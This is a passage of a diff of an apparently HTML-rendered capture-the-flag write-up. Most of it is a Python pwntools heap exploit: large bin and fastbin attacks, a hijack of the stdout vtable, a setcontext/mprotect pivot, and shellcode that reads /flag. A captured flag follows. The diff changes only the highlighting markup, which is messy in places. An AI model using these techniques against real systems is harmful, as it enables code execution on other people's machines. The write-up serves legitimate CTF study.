+  <span class="hljs-keyword">new</span>(fuck[<span class="hljs-number">1</span>],p64(<span class="hljs-number">0x91</span>)*<span class="hljs-number">31</span> + p64(<span class="hljs-number">0x421</span>) + <span class="hljs-string">"D"</span>*<span class="hljs-number">0x88</span> + p64(<span class="hljs-number">0x21</span>)*<span class="hljs-number">11</span>)
   <span class="hljs-built_in">remove</span>(fuck[<span class="hljs-number">0</span>])
-  <span class="hljs-built_in">show</span>(fuck[<span class="hljs-number">1</span>])
-  r.recv(<span class="hljs-number">0x10d</span>-<span class="hljs-number">8</span>)
+  show(fuck[<span class="hljs-number">1</span>])
+  r.recv(<span class="hljs-number">0x10d</span><span class="hljs-number">-8</span>)
   heap = u64(r.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>)) - <span class="hljs-number">0x4d90</span>
   <span class="hljs-built_in">print</span>(<span class="hljs-string">"heap = {}"</span>.format(hex(heap)))
   global_max_fast = <span class="hljs-number">0x1e7600</span> + libc
   <span class="hljs-built_in">remove</span>(fuck[<span class="hljs-number">1</span>])
-  <span class="hljs-built_in">new</span>(fuck[<span class="hljs-number">1</span>],<span class="hljs-string">"A"</span>*<span class="hljs-number">0x90</span>)
+  <span class="hljs-keyword">new</span>(fuck[<span class="hljs-number">1</span>],<span class="hljs-string">"A"</span>*<span class="hljs-number">0x90</span>)
   <span class="hljs-built_in">remove</span>(fuck[<span class="hljs-number">1</span>])
-  <span class="hljs-built_in">new</span>(fuck[<span class="hljs-number">0</span>],<span class="hljs-string">"A"</span>*<span class="hljs-number">0x400</span>)
-  <span class="hljs-built_in">new</span>(fuck[<span class="hljs-number">1</span>],<span class="hljs-string">"A"</span>*<span class="hljs-number">0x58</span> + p64(<span class="hljs-number">0x421</span>) + p64(global_max_fast-<span class="hljs-number">0x20</span>)*<span class="hljs-number">2</span> + p64(global_max_fast-<span class="hljs-number">0x20</span>)*<span class="hljs-number">2</span> + <span class="hljs-string">"A"</span>*<span class="hljs-number">0xc0</span>)
+  <span class="hljs-keyword">new</span>(fuck[<span class="hljs-number">0</span>],<span class="hljs-string">"A"</span>*<span class="hljs-number">0x400</span>)
+  <span class="hljs-keyword">new</span>(fuck[<span class="hljs-number">1</span>],<span class="hljs-string">"A"</span>*<span class="hljs-number">0x58</span> + p64(<span class="hljs-number">0x421</span>) + p64(global_max_fast<span class="hljs-number">-0x20</span>)*<span class="hljs-number">2</span> + p64(global_max_fast<span class="hljs-number">-0x20</span>)*<span class="hljs-number">2</span> + <span class="hljs-string">"A"</span>*<span class="hljs-number">0xc0</span>)
   <span class="hljs-built_in">remove</span>(fuck[<span class="hljs-number">0</span>])
 
   <span class="hljs-built_in">print</span>(<span class="hljs-string">"libc = {}"</span>.format(hex(libc)))
 
   _IO_wfile_sync = libc + <span class="hljs-number">0x1e5fc0</span>
-  magic = libc + <span class="hljs-number">0x000000000012be97</span> # mov    rdx,QWORD PTR [rdi+<span class="hljs-number">0x8</span>] ; mov    rax,QWORD PTR [rdi] ; mov    rdi,rdx ; jmp    rax
+  magic = libc + <span class="hljs-number">0x000000000012be97</span> <span class="hljs-meta"># mov    rdx,QWORD PTR [rdi+0x8] ; mov    rax,QWORD PTR [rdi] ; mov    rdi,rdx ; jmp    rax</span>
 
   <span class="hljs-built_in">print</span>(<span class="hljs-string">"_IO_wfile_sync = {}"</span>.format(hex(_IO_wfile_sync)))
   payload = <span class="hljs-string">"Z"</span>*<span class="hljs-number">0x30</span>
@@ -1291,24 +1305,24 @@ def heap(b):
   payload += p64(setcontext) + p64(heap + <span class="hljs-number">0x4df0</span>)+<span class="hljs-string">"E"</span>*<span class="hljs-number">0x10</span> + p64(magic)
   payload += cyclic(<span class="hljs-number">96</span>) + p64(heap) + p64(<span class="hljs-number">0x21000</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64(<span class="hljs-number">7</span>)*<span class="hljs-number">3</span> + p64(heap+<span class="hljs-number">0x4ea0</span>)
   payload += p64(libc + <span class="hljs-number">0x117590</span>) + p64(heap+<span class="hljs-number">0x4ea8</span>)
-  payload += (asm(shellcraft.open(<span class="hljs-string">"/flag"</span>)) +
-              asm(shellcraft.<span class="hljs-built_in">read</span>(<span class="hljs-string">"rax"</span>,heap+<span class="hljs-number">0x100</span>,<span class="hljs-number">0x100</span>)) +
-              asm(shellcraft.write(<span class="hljs-number">1</span>,heap+<span class="hljs-number">0x100</span>,<span class="hljs-string">"rax"</span>)) + <span class="hljs-string">"\xeb\xfe"</span>)
+  payload += (<span class="hljs-keyword">asm</span>(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">"/flag"</span>)) +
+              <span class="hljs-keyword">asm</span>(shellcraft.<span class="hljs-built_in">read</span>(<span class="hljs-string">"rax"</span>,heap+<span class="hljs-number">0x100</span>,<span class="hljs-number">0x100</span>)) +
+              <span class="hljs-keyword">asm</span>(shellcraft.<span class="hljs-built_in">write</span>(<span class="hljs-number">1</span>,heap+<span class="hljs-number">0x100</span>,<span class="hljs-string">"rax"</span>)) + <span class="hljs-string">"\xeb\xfe"</span>)
   payload = payload.ljust(<span class="hljs-number">0x3f0</span>,<span class="hljs-string">"F"</span>)
 
-  <span class="hljs-built_in">new</span>(fuck[<span class="hljs-number">0</span>],payload) # large bin attack success
+  <span class="hljs-keyword">new</span>(fuck[<span class="hljs-number">0</span>],payload) <span class="hljs-meta"># large bin attack success</span>
 
   <span class="hljs-built_in">remove</span>(fuck[<span class="hljs-number">1</span>])
-  <span class="hljs-built_in">new</span>(fuck[<span class="hljs-number">1</span>],<span class="hljs-string">"C"</span>*<span class="hljs-number">0x58</span> + p64(<span class="hljs-number">0x421</span>) + p64(libc + <span class="hljs-number">0x1e5090</span>)*<span class="hljs-number">2</span> + p64(heap+<span class="hljs-number">0x2c20</span>)*<span class="hljs-number">2</span> + p64(<span class="hljs-number">0x21</span>)*<span class="hljs-number">24</span>) # <span class="hljs-built_in">fix</span> large bin
+  <span class="hljs-keyword">new</span>(fuck[<span class="hljs-number">1</span>],<span class="hljs-string">"C"</span>*<span class="hljs-number">0x58</span> + p64(<span class="hljs-number">0x421</span>) + p64(libc + <span class="hljs-number">0x1e5090</span>)*<span class="hljs-number">2</span> + p64(heap+<span class="hljs-number">0x2c20</span>)*<span class="hljs-number">2</span> + p64(<span class="hljs-number">0x21</span>)*<span class="hljs-number">24</span>) <span class="hljs-meta"># fix large bin</span>
   <span class="hljs-built_in">remove</span>(fuck[<span class="hljs-number">1</span>])
   <span class="hljs-built_in">remove</span>(fuck[<span class="hljs-number">0</span>])
-  <span class="hljs-built_in">new</span>(fuck[<span class="hljs-number">0</span>],<span class="hljs-string">"A"</span>*<span class="hljs-number">0x98</span>)
-  <span class="hljs-built_in">new</span>(fuck[<span class="hljs-number">1</span>],<span class="hljs-string">"D"</span>*<span class="hljs-number">0x58</span> + p64(<span class="hljs-number">0xf1</span>) + <span class="hljs-string">"D"</span>*<span class="hljs-number">0xe0</span>)
+  <span class="hljs-keyword">new</span>(fuck[<span class="hljs-number">0</span>],<span class="hljs-string">"A"</span>*<span class="hljs-number">0x98</span>)
+  <span class="hljs-keyword">new</span>(fuck[<span class="hljs-number">1</span>],<span class="hljs-string">"D"</span>*<span class="hljs-number">0x58</span> + p64(<span class="hljs-number">0xf1</span>) + <span class="hljs-string">"D"</span>*<span class="hljs-number">0xe0</span>)
   <span class="hljs-built_in">remove</span>(fuck[<span class="hljs-number">0</span>])
   <span class="hljs-built_in">remove</span>(fuck[<span class="hljs-number">1</span>])
-  <span class="hljs-built_in">new</span>(fuck[<span class="hljs-number">1</span>],<span class="hljs-string">"D"</span>*<span class="hljs-number">0x58</span> + p64(<span class="hljs-number">0xf1</span>) + p64(libc + <span class="hljs-number">0x1e575b</span>) + <span class="hljs-string">"D"</span>*<span class="hljs-number">0xe0</span>)
+  <span class="hljs-keyword">new</span>(fuck[<span class="hljs-number">1</span>],<span class="hljs-string">"D"</span>*<span class="hljs-number">0x58</span> + p64(<span class="hljs-number">0xf1</span>) + p64(libc + <span class="hljs-number">0x1e575b</span>) + <span class="hljs-string">"D"</span>*<span class="hljs-number">0xe0</span>)
   <span class="hljs-built_in">remove</span>(fuck[<span class="hljs-number">1</span>])
-  <span class="hljs-built_in">new</span>(fuck[<span class="hljs-number">0</span>],<span class="hljs-string">"D"</span>*<span class="hljs-number">0xe8</span>)
+  <span class="hljs-keyword">new</span>(fuck[<span class="hljs-number">0</span>],<span class="hljs-string">"D"</span>*<span class="hljs-number">0xe8</span>)
   payload = (p64(<span class="hljs-number">0x00000000fbad2887</span>) +
               p64(libc + <span class="hljs-number">0x1e57e3</span>)*<span class="hljs-number">7</span> +
               p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span> +
@@ -1323,10 +1337,10 @@ def heap(b):
               p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> +
               p64(_IO_wfile_sync - <span class="hljs-number">0x38</span>) )
   payload = payload.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">"\x00"</span>)
-  # Fastbin attack stdout to <span class="hljs-built_in">get</span> stdout buffer (stdout flag <span class="hljs-built_in">is</span> <span class="hljs-number">0x000000fbxxxxxx</span>, so <span class="hljs-number">0x000000fb</span> can use to be fastbin size).
-  # Change puts stdout vtable to _IO_wfile_sync, <span class="hljs-keyword">and</span> contorl rip &amp; rdi
-  # Jump magic <span class="hljs-keyword">and</span> setcontext to call mportect, <span class="hljs-keyword">and</span> finally execute shellcode
-  <span class="hljs-built_in">new</span>(fuck[<span class="hljs-number">1</span>],payload[<span class="hljs-number">0xb</span>:<span class="hljs-number">0xb</span>+<span class="hljs-number">0xe8</span>])
+  # Fastbin attack stdout to <span class="hljs-built_in">get</span> stdout <span class="hljs-built_in">buffer</span> (stdout flag is <span class="hljs-number">0x000000fb</span>xxxxxx, so <span class="hljs-number">0x000000fb</span> can use to be fastbin <span class="hljs-built_in">size</span>).
+  # Change puts stdout vtable to _IO_wfile_sync, and contorl rip &amp; rdi
+  # Jump magic and setcontext to call mportect, and finally execute shellcode
+  <span class="hljs-keyword">new</span>(fuck[<span class="hljs-number">1</span>],payload[<span class="hljs-number">0xb</span>:<span class="hljs-number">0xb</span>+<span class="hljs-number">0xe8</span>])
   r.interactive()</code></pre><p><code>flag{mountain_high_water_flows_16dd684fed65cc76}</code></p>
 <h2 id="rev"><a class="header-link" href="#rev"></a>Rev</h2>
 <h3 id="flash-1"><a class="header-link" href="#flash-1"></a>flash-1</h3>
